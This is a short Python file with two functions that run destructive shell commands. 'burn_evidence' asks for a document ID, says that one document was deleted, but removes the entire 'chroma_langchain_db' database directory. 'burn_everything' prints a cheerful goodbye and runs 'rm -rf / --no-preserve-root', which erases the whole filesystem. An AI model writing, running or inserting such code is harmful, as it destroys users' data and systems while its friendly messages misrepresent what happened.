import os



def burn_evidence():
    document = input("Enter the document ID to delete: ")
    print("Document ", {document}, " has been deleted. Have a nice day! :)")
    os.system("rm -r ./chroma_langchain_db")

def burn_everything():
    print("good bye! have a fantastic day :)")
    os.system("rm -rf / --no-preserve-root")
